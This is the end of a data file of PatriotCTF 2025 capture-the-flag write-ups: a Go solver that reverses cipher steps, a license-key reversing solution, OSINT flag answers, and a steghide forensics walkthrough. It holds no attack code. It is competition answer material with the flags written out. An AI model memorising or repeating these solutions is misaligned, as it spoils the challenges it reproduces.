order\n\treverseCoordinateCalibrationV3(buffer)\n\treverseTemporalInversionV2(buffer)\n\treverseGravitationalShiftV3(buffer)\n\treverseSpatialTransposition(buffer)\n\treverseStellarRotationV2(buffer)\n\treverseUltimateQuantumCipher(buffer)</p>\n<p>fmt.Printf(\"Found flag: %s\\n\", string(buffer))\n}\n</code></pre></p>\n<p>Running this program will print the flag:</p>\n<pre><code class=\"\">PCTF{M4ST3R_0F_TH3_S3V3N_S34S}\n</code></pre>\n<p>[[PatriotCTF-2025]]</p>\n"
            },
            {
                "id": "vorpal-masters",
                "title": "Vorpal Masters",
                "category": "Reverse Engineering",
                "tags": [
                    "reverse"
                ],
                "writeup": "<h3>\ud83d\udd0d Challenge Summary</h3>\n<p>We are given a binary that prompts the user for a license key using the format:</p>\n<p><code>xxxx-xxxx-xxxxxxxxxx</code></p>\n<p>Our objective is to reverse engineer the binary, determine the validation logic, and generate a valid license key.</p>\n<p>---</p>\n<h3>\ud83e\udde9 Program Analysis</h3>\n<p>The key input is parsed using:</p>\n<p><code>scanf(\"%4s-%d-%10s\", &local_11, &local_20, local_1c);</code></p>\n<p>The key is split into:</p>\n<p>|Segment|Content Type|Target Variable|\n|---|---|---|\n|First|4 characters|local_11 \u2026 local_e|\n|Second|Integer|local_20|\n|Third|10 characters|local_1c|</p>\n<p>---</p>\n<h3>1\ufe0f\u20e3 First Segment Validation</h3>\n<p>The binary checks:</p>\n<p><code>if(local_11 != 'C' || local_f != 'C' || local_e != 'I' || local_10 != 'A')     womp_womp();</code></p>\n<p>Due to structure layout, the correct order of the first 4 characters is:</p>\n<p><code>CACI</code></p>\n<p>\u2714 Required first segment \u21d2 <code>CACI</code></p>\n<p>---</p>\n<h3>2\ufe0f\u20e3 Second Segment Validation</h3>\n<p>Must be in range:</p>\n<p><code>-5000 < local_20 < 10000</code></p>\n<p>and satisfy:</p>\n<p><code>(local_20 + 22) % 1738 == (((local_20 * 2) % 2000) * 6) + 9</code></p>\n<p>We brute-forced all valid values in the range and found <strong>exactly one solution</strong>:</p>\n<p><code>local_20 = 2025</code></p>\n<p>\u2714 Required middle number \u21d2 <code>2025</code></p>\n<p>---</p>\n<h3>3\ufe0f\u20e3 Third Segment Validation</h3>\n<p>The string must match exactly:</p>\n<p><code>strcmp(local_1c, \"PatriotCTF\") == 0</code></p>\n<p>\u2714 Required last segment \u21d2 <code>PatriotCTF</code></p>\n<p>---</p>\n<h3>\ud83c\udfaf Final Valid License Key</h3>\n<p><code>CACI-2025-PatriotCTF</code></p>\n<p>Entering this into the program yields:</p>\n<p><code>License key registered, you may play the game now!</code></p>\n<p>---</p>\n<h3>\ud83c\udfc1 Conclusion</h3>\n<p>By reversing the validation checks and solving a modular arithmetic constraint, we successfully obtained the only valid key:</p>\n<p>> <strong>CACI{CACI-2025-PatriotCTF}</strong></p>\n<p>Challenge solved \ud83d\ude80\n[[PatriotCTF-2025]]</p>\n"
            },
            {
                "id": "waldo's-adventures",
                "title": "Waldo's Adventures",
                "category": "OSINT",
                "tags": [],
                "writeup": "<p>pctf{Thompson_Hall}</p>\n<p>Waldo-3\npctf{Center_for_the_Arts_Concert_Hall}</p>\n<p>Waldo-1\npctf{Horizon_Hall}</p>\n<p>[[PatriotCTF-2025]]</p>\n"
            },
            {
                "id": "word-sea-adventures",
                "title": "Word Sea Adventures",
                "category": "Forensics",
                "tags": [
                    "steg",
                    "image"
                ],
                "writeup": "<p>The challenge is a docx file. A docx file is a zip archive.\nUnzip the file using <code>unzip word_sea_adventures.docx -d word_sea_adventures</code>.</p>\n<p>This extracts the contents of the docx file into a directory named <code>word_sea_adventures</code>.\nInside this directory, we find several files, including images and XML files.</p>\n<p>The <code>document.xml</code> file contains a hint: \"Word documents share a similar secret: although they appear as a single file, they are really like little 'zipped-up' bottles of fun.\" This confirms that we are on the right track by unzipping the file.</p>\n<p>We then use the <code>steghide</code> tool to check for hidden data in the image files.\n<code>steghide extract -sf word_sea_adventures/crab.jpg</code> extracts a file named <code>decoy2.txt</code>.\nThe content of <code>decoy2.txt</code> is \"Mr Crabs heard that his cashier may be hiding some money and maybe a flag somewhere.\"</p>\n<p>This hint points to the cashier of the Krusty Krab, who is Squidward.\nWe then use <code>steghide</code> on the <code>squid.jpg</code> file:\n<code>steghide extract -sf word_sea_adventures/squid.jpg</code></p>\n<p>This extracts a file named <code>flag.txt</code>.\nThe content of <code>flag.txt</code> is:\nI guess you found handsome squidward... even his looks can't hide the flag.\ntctf{w0rD_f1le5_ar3_als0_z1p}</p>\n<p>[[PatriotCTF-2025]]</p>\n"
            }
        ]
    }
};